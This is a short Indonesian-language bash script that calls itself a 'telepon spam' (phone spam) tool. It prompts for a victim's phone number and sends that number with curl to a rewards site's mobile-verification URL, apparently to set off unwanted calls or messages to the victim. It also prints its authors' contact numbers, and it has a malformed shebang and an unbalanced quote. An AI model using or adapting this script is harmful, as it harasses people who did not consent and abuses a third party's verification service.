#!bin/bash
clear
echo "****************************"
 
echo "____________________________"
echo "PEMBUAT RONAL/MR-ZONK" ID,KONTAK 089528100123"
echo "____________________________"
echo "****************************"
figlet Telp | lolcat
echo "::::::::::::::::::::::::::::::"
echo '
[1], telepon spam
[2], keluar &kontak admin
'
echo "::::::::::::::::::::::::::::::"
echo
read -p "masukan pilihan kalian lurd : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan No Target contoh:89528100123  : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo "thanks ya lurd udah pakai tools MR-ZONK"
echo "kontak admin?081382379407"
exit
fi
echo
